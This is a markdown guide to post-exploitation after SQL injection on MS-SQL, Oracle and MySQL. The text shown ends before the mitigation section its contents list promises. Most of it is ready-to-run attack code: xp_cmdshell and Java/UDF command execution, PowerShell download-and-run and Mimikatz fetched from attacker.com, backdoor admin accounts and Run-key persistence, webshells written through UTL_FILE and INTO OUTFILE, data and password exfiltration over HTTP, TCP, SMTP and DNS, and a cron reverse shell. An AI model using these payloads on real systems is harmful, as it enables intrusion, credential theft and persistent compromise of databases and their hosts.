# SQL Injection Post-Exploitation Guide

## Table of Contents

1. [Overview](#overview)
2. [MS-SQL Server Post-Exploitation](#ms-sql-server-post-exploitation)
3. [Oracle Database Post-Exploitation](#oracle-database-post-exploitation)
4. [MySQL/MariaDB Post-Exploitation](#mysqlmariadb-post-exploitation)
5. [Mitigation Strategies](#mitigation-strategies)
6. [References](#references)

---

## Overview

This guide details attack escalation paths available after successful SQL injection exploitation. While basic SQL injection enables data extraction, advanced attackers leverage built-in database features to achieve operating system command execution, file manipulation, privilege escalation, and lateral movement within the target environment.

### Purpose

- **For Security Auditors**: Understand the full impact scope of SQL injection vulnerabilities
- **For Tool Developers**: Implement post-exploitation capabilities in automated tools
- **For Defenders**: Learn attack techniques to implement proper mitigations

### Attack Progression

1. **Initial Exploitation**: SQL injection vulnerability discovery
2. **Database Enumeration**: Version, users, privileges, database structure
3. **Privilege Assessment**: Determine current privilege level
4. **Lateral Escalation**: Leverage database features for OS-level access
5. **Persistence**: Maintain access through backdoors or scheduled tasks

---

## MS-SQL Server Post-Exploitation

Microsoft SQL Server provides powerful extended stored procedures and system functions that, when combined with SQL injection, enable extensive post-exploitation capabilities.

### 1. Operating System Command Execution

#### xp_cmdshell

The most powerful feature for OS command execution in MS-SQL.

**Prerequisites:**
- `xp_cmdshell` must be enabled (disabled by default)
- User must have `sysadmin` role or `CONTROL SERVER` permission

**Enable xp_cmdshell:**
```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Execute OS commands:**
```sql
-- Basic command execution
EXEC xp_cmdshell 'whoami';

-- Command with output capture
EXEC xp_cmdshell 'dir C:\';

-- Download and execute payload
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')"';

-- Add local administrator
EXEC xp_cmdshell 'net user hacker P@ssw0rd123 /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
```

**SQL Injection Context:**
```sql
-- In vulnerable parameter
' EXEC xp_cmdshell 'whoami'; --

-- Union-based injection
' UNION SELECT NULL, NULL, NULL; EXEC xp_cmdshell 'whoami'; --

-- Stacked queries
'; EXEC xp_cmdshell 'whoami'; --
```

#### sp_OACreate and sp_OAMethod (Alternative to xp_cmdshell)

Use Windows Script Host (WSH) when `xp_cmdshell` is disabled.

**Prerequisites:**
- `Ole Automation Procedures` must be enabled
- User needs appropriate permissions

**Enable Ole Automation:**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

**Execute commands via WSH:**
```sql
-- Execute command using WScript.Shell
DECLARE @output INT;
DECLARE @command VARCHAR(8000);
SET @command = 'cmd.exe /c whoami';

EXEC sp_OACreate 'wscript.shell', @output OUT;
EXEC sp_OAMethod @output, 'run', NULL, @command;
EXEC sp_OADestroy @output;
```

**More advanced execution:**
```sql
-- Execute PowerShell command
DECLARE @output INT, @command VARCHAR(8000);
SET @command = 'powershell.exe -ExecutionPolicy Bypass -Command "Get-Process"';

EXEC sp_OACreate 'wscript.shell', @output OUT;
EXEC sp_OAMethod @output, 'run', NULL, @command, 0, 1;
EXEC sp_OADestroy @output;
```

### 2. File System Operations

#### Reading Files

**Using BULK INSERT:**
```sql
-- Create temporary table
CREATE TABLE #temp (data VARCHAR(8000));

-- Read file content
BULK INSERT #temp FROM 'C:\Windows\System32\drivers\etc\hosts';

-- Display content
SELECT * FROM #temp;

-- Cleanup
DROP TABLE #temp;
```

**Using OPENROWSET:**
```sql
-- Read file (requires Ad Hoc Distributed Queries)
SELECT * FROM OPENROWSET(
    BULK 'C:\inetpub\wwwroot\web.config',
    SINGLE_CLOB
) AS data;
```

**Read with xp_cmdshell:**
```sql
-- Read file via type command
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';

-- Read with PowerShell
EXEC xp_cmdshell 'powershell Get-Content C:\sensitive\file.txt';
```

#### Writing Files

**Using xp_cmdshell:**
```sql
-- Write simple file
EXEC xp_cmdshell 'echo malicious content > C:\temp\backdoor.txt';

-- Write binary file via certutil
EXEC xp_cmdshell 'certutil -decode C:\temp\encoded.txt C:\temp\payload.exe';

-- Write using PowerShell
EXEC xp_cmdshell 'powershell -c "''backdoor content'' | Out-File -FilePath C:\inetpub\wwwroot\shell.aspx"';
```

**Using Ole Automation:**
```sql
-- Write file using FileSystemObject
DECLARE @ole INT;
DECLARE @file INT;

EXEC sp_OACreate 'Scripting.FileSystemObject', @ole OUT;
EXEC sp_OAMethod @ole, 'CreateTextFile', @file OUT, 'C:\temp\output.txt', 1;
EXEC sp_OAMethod @file, 'WriteLine', NULL, 'Malicious content here';
EXEC sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @ole;
```

**Export query results to file:**
```sql
-- Export data using bcp utility
EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout C:\temp\users.txt -c -T';
```

### 3. Registry Access

MS-SQL provides stored procedures to read and modify Windows registry.

**Read Registry:**
```sql
-- Read registry value
EXEC xp_regread 
    @rootkey='HKEY_LOCAL_MACHINE',
    @key='SOFTWARE\Microsoft\Windows NT\CurrentVersion',
    @value_name='ProductName';

-- Enumerate registry keys
EXEC xp_regenumkeys 
    @rootkey='HKEY_LOCAL_MACHINE',
    @key='SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
```

**Write Registry:**
```sql
-- Add registry value (requires sysadmin)
EXEC xp_regwrite
    @rootkey='HKEY_LOCAL_MACHINE',
    @key='SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    @value_name='Backdoor',
    @type='REG_SZ',
    @value='C:\temp\malware.exe';
```

**Delete Registry:**
```sql
-- Delete registry value
EXEC xp_regdeletevalue
    @rootkey='HKEY_LOCAL_MACHINE',
    @key='SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    @value_name='Backdoor';
```

### 4. Credential Harvesting

**Extract SQL Server Credentials:**
```sql
-- List all logins
SELECT name, type_desc, create_date, modify_date 
FROM sys.server_principals 
WHERE type IN ('S', 'U', 'G');

-- Extract password hashes (SQL authentication)
SELECT name, password_hash 
FROM sys.sql_logins;

-- Get linked server credentials
SELECT * FROM sys.linked_logins;
SELECT * FROM sys.servers;

-- Current login information
SELECT SYSTEM_USER, USER_NAME(), CURRENT_USER;
```

**Extract Windows Credentials:**
```sql
-- Dump cached credentials using Mimikatz via xp_cmdshell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/Invoke-Mimikatz.ps1''); Invoke-Mimikatz"';

-- Read credential manager
EXEC xp_cmdshell 'cmdkey /list';

-- Extract saved RDP credentials
EXEC xp_cmdshell 'reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"';
```

### 5. Privilege Escalation

**Check Current Privileges:**
```sql
-- Check if user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List all server roles for current user
SELECT 
    r.name AS RoleName,
    CASE WHEN IS_SRVROLEMEMBER(r.name) = 1 THEN 'Yes' ELSE 'No' END AS IsMember
FROM sys.server_principals r
WHERE r.type = 'R'
ORDER BY r.name;

-- Check database permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

**Escalation Techniques:**

**1. Exploit Impersonation:**
```sql
-- Check if IMPERSONATE permission exists
SELECT DISTINCT b.name AS grantee_name, c.name AS impersonated_name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id
INNER JOIN sys.server_principals c ON a.major_id = c.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
-- Now execute privileged commands
REVERT;
```

**2. Exploit Trustworthy Databases:**
```sql
-- Find trustworthy databases
SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;

-- Exploit trustworthy database for escalation
USE TrustworthyDB;
GO
CREATE PROCEDURE sp_elevate
WITH EXECUTE AS OWNER
AS
    EXEC sp_addsrvrolemember 'normaluser', 'sysadmin';
GO

-- Execute to gain sysadmin
EXEC sp_elevate;
```

**3. SQL Agent Jobs (if Agent is running):**
```sql
-- Check if SQL Agent is running
EXEC master.dbo.xp_servicecontrol 'QueryState', 'SQLServerAGENT';

-- Create malicious job (requires SQLAgentUserRole)
USE msdb;
GO
EXEC sp_add_job @job_name = 'Backdoor Job';
EXEC sp_add_jobstep 
    @job_name = 'Backdoor Job',
    @step_name = 'Execute Command',
    @subsystem = 'CMDEXEC',
    @command = 'net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add';
EXEC sp_add_jobschedule 
    @job_name = 'Backdoor Job',
    @name = 'RunOnce',
    @freq_type = 1;
EXEC sp_start_job @job_name = 'Backdoor Job';
```

### 6. Lateral Movement

**Access Linked Servers:**
```sql
-- List linked servers
EXEC sp_linkedservers;

-- Execute commands on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServerName];

-- Query linked server
SELECT * FROM [LinkedServerName].master.sys.databases;

-- Chain through multiple linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''' ) AT [NextLinkedServer]') AT [FirstLinkedServer];
```

**SMB Relay Attacks:**
```sql
-- Force server to authenticate to attacker's SMB
EXEC xp_dirtree '\\attacker.com\share';
EXEC xp_fileexist '\\attacker.com\share\file.txt';

-- Capture NetNTLMv2 hash for cracking/relaying
EXEC xp_subdirs '\\attacker.com\share';
```

### 7. Persistence Mechanisms

**Startup Stored Procedures:**
```sql
-- Mark procedure to run on SQL Server startup (requires sysadmin)
USE master;
GO
CREATE PROCEDURE sp_backdoor
AS
    -- Backdoor code here
    EXEC xp_cmdshell 'powershell -c "connection to C2 server"';
GO
EXEC sp_procoption @ProcName = 'sp_backdoor', @OptionName = 'startup', @OptionValue = 'on';
```

**Create Backdoor Login:**
```sql
-- Create hidden sysadmin account
CREATE LOGIN [BackdoorAdmin] WITH PASSWORD = 'ComplexP@ssw0rd123!';
EXEC sp_addsrvrolemember 'BackdoorAdmin', 'sysadmin';

-- Hide login from sys.server_principals view (more advanced)
-- Use obscure naming or special characters
CREATE LOGIN [NT AUTHORITY\SYSTEM ] WITH PASSWORD = 'P@ssw0rd'; -- Note trailing space
```

**Triggers for Persistence:**
```sql
-- DDL trigger for persistence
CREATE TRIGGER backdoor_trigger
ON ALL SERVER
FOR DDL_LOGIN_EVENTS
AS
    -- Execute backdoor on any login event
    EXEC xp_cmdshell 'powershell -c "beacon to attacker"';
GO
```

---

## Oracle Database Post-Exploitation

Oracle Database provides extensive functionality through PL/SQL packages and Java stored procedures that enable post-exploitation activities.

### 1. Operating System Command Execution

#### Using Java Stored Procedures

Oracle allows creation of Java stored procedures that can execute OS commands.

**Prerequisites:**
- User must have `CREATE PROCEDURE` or `CREATE ANY PROCEDURE` privilege
- Java permissions must be granted

**Grant Required Permissions:**
```sql
-- Grant Java permissions (requires DBA)
BEGIN
    DBMS_JAVA.GRANT_PERMISSION(
        'USERNAME',
        'SYS:java.io.FilePermission',
        '<<ALL FILES>>',
        'execute'
    );
    
    DBMS_JAVA.GRANT_PERMISSION(
        'USERNAME',
        'SYS:java.lang.RuntimePermission',
        'writeFileDescriptor',
        ''
    );
    
    DBMS_JAVA.GRANT_PERMISSION(
        'USERNAME',
        'SYS:java.lang.RuntimePermission',
        'readFileDescriptor',
        ''
    );
END;
/
```

**Create Java-Based Command Execution:**
```sql
-- Create Java source
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OSCommand" AS
import java.io.*;
public class OSCommand {
    public static String execCommand(String command) {
        try {
            String[] cmd;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", command};
            } else {
                cmd = new String[]{"/bin/sh", "-c", command};
            }
            
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            process.waitFor();
            return output.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
/

-- Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION exec_cmd(p_command IN VARCHAR2)
RETURN VARCHAR2 AS
LANGUAGE JAVA
NAME 'OSCommand.execCommand(java.lang.String) return java.lang.String';
/

-- Execute OS commands
SELECT exec_cmd('whoami') FROM dual;
SELECT exec_cmd('id') FROM dual;
SELECT exec_cmd('cat /etc/passwd') FROM dual;
```

**Simpler Java Execution Method:**
```sql
-- Inline Java execution (Oracle 11g+)
SELECT DBMS_JAVA_TEST.FUNCALL(
    'oracle/aurora/util/Wrapper',
    'main',
    '/bin/bash',
    '-c',
    'id > /tmp/output.txt'
) FROM dual;
```

#### Using DBMS_SCHEDULER

Oracle's job scheduler can execute OS commands.

**Prerequisites:**
- User must have `CREATE JOB` privilege
- External jobs must be enabled

**Execute Commands via Scheduler:**
```sql
-- Create executable script first
BEGIN
    -- Write command to file
    DECLARE
        l_file UTL_FILE.FILE_TYPE;
    BEGIN
        l_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'cmd.sh', 'W');
        UTL_FILE.PUT_LINE(l_file, '#!/bin/bash');
        UTL_FILE.PUT_LINE(l_file, 'whoami > /tmp/oracle_output.txt');
        UTL_FILE.FCLOSE(l_file);
    END;
END;
/

-- Create and run external job
BEGIN
    DBMS_SCHEDULER.CREATE_JOB(
        job_name   => 'EXEC_JOB',
        job_type   => 'EXECUTABLE',
        job_action => '/tmp/cmd.sh',
        enabled    => TRUE,
        auto_drop  => TRUE
    );
END;
/

-- Wait and read output
SELECT UTL_FILE.GET_LINE('DIRECTORY_NAME', 'oracle_output.txt') FROM dual;
```

### 2. File System Operations

#### Reading Files

**Using UTL_FILE:**
```sql
-- Grant directory access (requires DBA)
CREATE OR REPLACE DIRECTORY DATA_DIR AS '/etc';
GRANT READ, WRITE ON DIRECTORY DATA_DIR TO username;

-- Create function to read file
CREATE OR REPLACE FUNCTION read_file(
    p_directory IN VARCHAR2,
    p_filename IN VARCHAR2
) RETURN CLOB AS
    l_file UTL_FILE.FILE_TYPE;
    l_buffer VARCHAR2(32767);
    l_clob CLOB;
BEGIN
    DBMS_LOB.CREATETEMPORARY(l_clob, TRUE);
    l_file := UTL_FILE.FOPEN(p_directory, p_filename, 'R');
    
    LOOP
        BEGIN
            UTL_FILE.GET_LINE(l_file, l_buffer);
            DBMS_LOB.WRITEAPPEND(l_clob, LENGTH(l_buffer) + 1, l_buffer || CHR(10));
        EXCEPTION
            WHEN NO_DATA_FOUND THEN
                EXIT;
        END;
    END LOOP;
    
    UTL_FILE.FCLOSE(l_file);
    RETURN l_clob;
END;
/

-- Read file
SELECT read_file('DATA_DIR', 'passwd') FROM dual;
```

**Using External Tables:**
```sql
-- Create external table pointing to file
CREATE TABLE ext_passwd (
    line VARCHAR2(4000)
)
ORGANIZATION EXTERNAL (
    TYPE ORACLE_LOADER
    DEFAULT DIRECTORY DATA_DIR
    ACCESS PARAMETERS (
        RECORDS DELIMITED BY NEWLINE
        FIELDS TERMINATED BY '|'
        MISSING FIELD VALUES ARE NULL
    )
    LOCATION ('passwd')
);

-- Read file content
SELECT * FROM ext_passwd;
```

**Using Java:**
```sql
-- Java-based file reading
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "FileReader" AS
import java.io.*;
import java.nio.file.*;
public class FileReader {
    public static String readFile(String filepath) {
        try {
            return new String(Files.readAllBytes(Paths.get(filepath)));
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
/

CREATE OR REPLACE FUNCTION java_read_file(p_path VARCHAR2)
RETURN VARCHAR2 AS
LANGUAGE JAVA
NAME 'FileReader.readFile(java.lang.String) return java.lang.String';
/

-- Usage
SELECT java_read_file('/etc/passwd') FROM dual;
```

#### Writing Files

**Using UTL_FILE:**
```sql
-- Write to file
DECLARE
    l_file UTL_FILE.FILE_TYPE;
BEGIN
    l_file := UTL_FILE.FOPEN('DATA_DIR', 'backdoor.txt', 'W');
    UTL_FILE.PUT_LINE(l_file, 'Malicious content');
    UTL_FILE.FCLOSE(l_file);
END;
/

-- Write webshell to web directory
DECLARE
    l_file UTL_FILE.FILE_TYPE;
BEGIN
    l_file := UTL_FILE.FOPEN('WEB_DIR', 'shell.jsp', 'W');
    UTL_FILE.PUT_LINE(l_file, '<%@ page import="java.io.*" %>');
    UTL_FILE.PUT_LINE(l_file, '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>');
    UTL_FILE.FCLOSE(l_file);
END;
/
```

**Using Java:**
```sql
-- Java-based file writing
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "FileWriter" AS
import java.io.*;
import java.nio.file.*;
public class FileWriter {
    public static String writeFile(String filepath, String content) {
        try {
            Files.write(Paths.get(filepath), content.getBytes());
            return "Success";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
/

CREATE OR REPLACE FUNCTION java_write_file(
    p_path VARCHAR2,
    p_content VARCHAR2
) RETURN VARCHAR2 AS
LANGUAGE JAVA
NAME 'FileWriter.writeFile(java.lang.String, java.lang.String) return java.lang.String';
/

-- Usage
SELECT java_write_file('/tmp/backdoor.txt', 'malicious content') FROM dual;
```

### 3. Network Operations

**Outbound HTTP Requests:**
```sql
-- Using UTL_HTTP (requires ACL permission)
DECLARE
    l_response UTL_HTTP.HTML_PIECES;
    l_url VARCHAR2(200) := 'http://attacker.com/exfil?data=';
BEGIN
    -- Exfiltrate data via HTTP GET
    l_response := UTL_HTTP.REQUEST_PIECES(
        l_url || UTL_URL.ESCAPE((SELECT password FROM users WHERE username='admin'))
    );
END;
/

-- POST request with UTL_HTTP
DECLARE
    l_request UTL_HTTP.REQ;
    l_response UTL_HTTP.RESP;
    l_data VARCHAR2(4000);
BEGIN
    l_request := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil', 'POST');
    UTL_HTTP.SET_HEADER(l_request, 'Content-Type', 'application/x-www-form-urlencoded');
    
    l_data := 'data=' || UTL_URL.ESCAPE((SELECT listagg(username||':'||password, ',') 
                                          FROM users));
    UTL_HTTP.SET_HEADER(l_request, 'Content-Length', LENGTH(l_data));
    UTL_HTTP.WRITE_TEXT(l_request, l_data);
    
    l_response := UTL_HTTP.GET_RESPONSE(l_request);
    UTL_HTTP.END_RESPONSE(l_response);
END;
/
```

**TCP Connections:**
```sql
-- Using UTL_TCP for raw TCP connections
DECLARE
    l_conn UTL_TCP.CONNECTION;
    l_data VARCHAR2(4000);
BEGIN
    -- Connect to attacker's server
    l_conn := UTL_TCP.OPEN_CONNECTION('attacker.com', 4444);
    
    -- Send data
    l_data := 'Stolen data from Oracle';
    UTL_TCP.WRITE_LINE(l_conn, l_data);
    
    -- Close connection
    UTL_TCP.CLOSE_CONNECTION(l_conn);
END;
/
```

**SMTP Email Exfiltration:**
```sql
-- Using UTL_SMTP
DECLARE
    l_mailhost VARCHAR2(50) := 'mail.attacker.com';
    l_from VARCHAR2(50) := 'oracle@victim.com';
    l_to VARCHAR2(50) := 'attacker@attacker.com';
    l_connection UTL_SMTP.CONNECTION;
BEGIN
    -- Open connection
    l_connection := UTL_SMTP.OPEN_CONNECTION(l_mailhost, 25);
    UTL_SMTP.HELO(l_connection, l_mailhost);
    UTL_SMTP.MAIL(l_connection, l_from);
    UTL_SMTP.RCPT(l_connection, l_to);
    
    -- Send stolen data
    UTL_SMTP.OPEN_DATA(l_connection);
    UTL_SMTP.WRITE_DATA(l_connection, 'Subject: Stolen Data' || UTL_TCP.CRLF);
    UTL_SMTP.WRITE_DATA(l_connection, UTL_TCP.CRLF);
    UTL_SMTP.WRITE_DATA(l_connection, (SELECT listagg(username||':'||password, CHR(10)) 
                                        FROM dba_users WHERE password IS NOT NULL));
    UTL_SMTP.CLOSE_DATA(l_connection);
    
    -- Close connection
    UTL_SMTP.QUIT(l_connection);
END;
/
```

### 4. Credential Harvesting

**Extract Password Hashes:**
```sql
-- Extract user password hashes (requires DBA)
SELECT name, password, spare4 FROM sys.user$;

-- Oracle 11g and earlier (DES-based)
SELECT username, password FROM dba_users WHERE password IS NOT NULL;

-- Oracle 12c+ (uses spare4 for SHA-512)
SELECT username, spare4 FROM dba_users WHERE spare4 IS NOT NULL;

-- Get current user's hash
SELECT password FROM user_password_limits WHERE resource_name = 'PASSWORD';
```

**Extract Database Credentials:**
```sql
-- Find stored credentials in database links
SELECT owner, db_link, username, host 
FROM dba_db_links;

-- Extract connection strings
SELECT owner, name, userid FROM dba_credentials;

-- Check for plaintext passwords in application tables
SELECT table_name, column_name 
FROM all_tab_columns 
WHERE column_name LIKE '%PASS%' OR column_name LIKE '%PWD%';
```

### 5. Privilege Escalation

**Check Current Privileges:**
```sql
-- Check if user is DBA
SELECT * FROM session_privs WHERE privilege = 'DBA';

-- List all system privileges
SELECT * FROM session_privs ORDER BY privilege;

-- Check role privileges
SELECT * FROM session_roles;

-- List granted privileges
SELECT * FROM user_sys_privs;
SELECT * FROM user_role_privs;
```

**Escalation Techniques:**

**1. SQL Injection in Procedures:**
```sql
-- Find vulnerable procedures owned by privileged users
SELECT owner, object_name, object_type
FROM all_objects
WHERE object_type IN ('PROCEDURE', 'FUNCTION', 'PACKAGE')
AND owner IN ('SYS', 'SYSTEM')
AND object_name NOT LIKE 'BIN$%';

-- Exploit injectable procedure with AUTHID CURRENT_USER
-- If procedure executes dynamic SQL without proper validation
EXEC VULNERABLE_PROC('param'' || UTL_FILE operation || ''');
```

**2. Exploit Public Execute Permissions:**
```sql
-- Find objects with public execute that might be exploitable
SELECT owner, object_name, object_type, privilege
FROM dba_tab_privs
WHERE grantee = 'PUBLIC'
AND privilege = 'EXECUTE'
AND owner IN ('SYS', 'SYSTEM')
ORDER BY owner, object_name;

-- Example: Exploit public execute on SYS packages
-- Some packages may have insufficient input validation
```

**3. CREATE PROCEDURE for Privilege Escalation:**
```sql
-- If user has CREATE PROCEDURE, can potentially escalate
-- by creating procedures that execute with definer's rights
CREATE OR REPLACE PROCEDURE escalate_privs AUTHID DEFINER AS
BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO current_user_name';
END;
/

-- Try to get package owned by SYS to execute our code
```

**4. Exploit DEFAULT_PWD Accounts:**
```sql
-- Find accounts with default passwords
SELECT username FROM dba_users_with_defpwd;

-- Commonly known Oracle default accounts/passwords:
-- SCOTT/TIGER, DBSNMP/DBSNMP, SYSMAN/SYSMAN
-- HR/HR, OE/OE, PM/PM, SH/SH
```

### 6. Lateral Movement

**Database Links:**
```sql
-- List database links
SELECT * FROM dba_db_links;
SELECT * FROM all_db_links;

-- Access remote database via link
SELECT * FROM table@remote_db_link;

-- Execute commands on remote database
BEGIN
    EXECUTE IMMEDIATE 'CREATE TABLE test(id NUMBER)' AT remote_db_link;
END;
/
```

**External Authentication:**
```sql
-- Check for operating system authentication
SELECT username, authentication_type 
FROM dba_users 
WHERE authentication_type = 'EXTERNAL';

-- Identify users who can authenticate via OS
SELECT username FROM dba_users WHERE password = 'EXTERNAL';
```

### 7. Persistence Mechanisms

**Backdoor Triggers:**
```sql
-- Create logon trigger for persistence
CREATE OR REPLACE TRIGGER backdoor_trigger
AFTER LOGON ON DATABASE
BEGIN
    -- Execute backdoor code on any database login
    IF USER = 'TARGET_USER' THEN
        -- Exfiltrate or execute code
        NULL; -- Replace with backdoor logic
    END IF;
END;
/
```

**Create Hidden Users:**
```sql
-- Create backdoor user account
CREATE USER backdoor_admin IDENTIFIED BY "ComplexP@ssw0rd123!";
GRANT DBA TO backdoor_admin;
GRANT CREATE SESSION TO backdoor_admin;

-- Hide from basic queries by using special characters
CREATE USER "BACKDOOR$USER" IDENTIFIED BY "P@ssw0rd";
```

**Malicious Jobs:**
```sql
-- Create scheduled job for persistence
BEGIN
    DBMS_SCHEDULER.CREATE_JOB(
        job_name   => 'MAINTENANCE_JOB',
        job_type   => 'PLSQL_BLOCK',
        job_action => 'BEGIN exec_cmd(''beacon to C2 server''); END;',
        start_date => SYSTIMESTAMP,
        repeat_interval => 'FREQ=HOURLY; INTERVAL=1',
        enabled    => TRUE
    );
END;
/
```

---

## MySQL/MariaDB Post-Exploitation

MySQL provides several mechanisms for post-exploitation, though generally more restricted than MS-SQL or Oracle.

### 1. Operating System Command Execution

#### User Defined Functions (UDF)

The most reliable method for OS command execution in MySQL.

**Prerequisites:**
- `FILE` privilege to write to plugin directory
- Write access to plugin directory
- Ability to load shared libraries

**Create UDF for Command Execution:**

**Linux:**
```sql
-- Compile shared library (on attacker machine)
-- C code for sys_exec UDF:
/*
#include <stdio.h>
#include <stdlib.h>
#include <mysql.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "Expected exactly one string argument");
        return 1;
    }
    return 0;
}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    return system(args->args[0]);
}
*/

-- Compile: gcc -shared -fPIC -o sys_exec.so sys_exec.c $(mysql_config --include)

-- Find plugin directory
SELECT @@plugin_dir;

-- Write UDF library to plugin directory
SELECT BINARY 0x[hex_encoded_library] INTO DUMPFILE '/usr/lib/mysql/plugin/sys_exec.so';

-- Create function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'sys_exec.so';

-- Execute commands
SELECT sys_exec('whoami > /tmp/output.txt');
SELECT sys_exec('id');
```

**Windows:**
```sql
-- Write UDF DLL (lib_mysqludf_sys.dll)
SELECT BINARY 0x[hex_encoded_dll] INTO DUMPFILE 'C:\\MySQL\\lib\\plugin\\sys_exec.dll';

-- Create function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'sys_exec.dll';

-- Execute commands
SELECT sys_exec('whoami');
SELECT sys_exec('net user hacker P@ssw0rd /add');
```

**Pre-compiled UDF Libraries:**
```sql
-- Using sqlmap's UDF (lib_mysqludf_sys)
-- Functions: sys_exec, sys_eval, sys_get, sys_set

-- sys_eval returns command output
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('whoami');

-- sys_exec returns exit status
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/output.txt');
```

#### Exploiting LOAD DATA LOCAL INFILE

While not direct command execution, can read arbitrary files from client.

```sql
-- Enable local infile
SET GLOBAL local_infile = 1;

-- Read local file from client
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE temp_table
FIELDS TERMINATED BY '\n';

-- Display content
SELECT * FROM temp_table;
```

### 2. File System Operations

#### Reading Files

**Using LOAD_FILE:**
```sql
-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Read and exfiltrate via DNS
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\file.txt'));

-- Base64 encode to handle binary files
SELECT TO_BASE64(LOAD_FILE('/etc/shadow'));
```

**Check File Existence:**
```sql
-- Check if file exists
SELECT IF(LOAD_FILE('/etc/passwd') IS NULL, 'Not Found', 'Found');

-- Brute force file paths
SELECT CASE 
    WHEN LOAD_FILE('/var/www/html/config.php') IS NOT NULL THEN 'Found'
    WHEN LOAD_FILE('/var/www/config.php') IS NOT NULL THEN 'Found'
    ELSE 'Not Found'
END;
```

#### Writing Files

**Using INTO OUTFILE:**
```sql
-- Write query results to file (requires FILE privilege and secure_file_priv not set)
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- Write webshell to web directory
SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/cmd.php';

-- Write SSH key
SELECT 'ssh-rsa AAAAB3NzaC1yc2EA... attacker@evil' 
INTO OUTFILE '/root/.ssh/authorized_keys';

-- Write cron job
SELECT '* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1'
INTO OUTFILE '/var/spool/cron/root';
```

**Using INTO DUMPFILE:**
```sql
-- Write binary files (no formatting applied)
SELECT BINARY content 
FROM binary_table 
INTO DUMPFILE '/var/www/html/shell.php';

-- Write UDF library
SELECT BINARY 0x4d5a9000... -- MZ header for Windows DLL/EXE
INTO DUMPFILE 'C:\\MySQL\\lib\\plugin\\backdoor.dll';
```

**Check secure_file_priv Setting:**
```sql
-- Check restrictions on file operations
SELECT @@secure_file_priv;
-- NULL = no restriction
-- Empty string = no restriction (older versions)
-- Directory path = restricted to that directory
```

### 3. Credential Harvesting

**Extract User Credentials:**
```sql
-- Get password hashes (requires SELECT on mysql.user)
SELECT user, host, password FROM mysql.user;

-- MySQL 5.7+
SELECT user, host, authentication_string FROM mysql.user;

-- Get current user hash
SELECT authentication_string FROM mysql.user 
WHERE user = CURRENT_USER();

-- List all users
SELECT DISTINCT user, host FROM mysql.user;
```

**Check User Privileges:**
```sql
-- Get privileges for all users
SELECT * FROM mysql.user;

-- Get current user privileges
SELECT * FROM mysql.user WHERE user = CURRENT_USER();

-- Show grants for user
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';

-- Check for FILE privilege
SELECT user, host, File_priv FROM mysql.user;
```

**Extract Application Credentials:**
```sql
-- Search for password columns
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%'
OR column_name LIKE '%secret%' OR column_name LIKE '%token%';

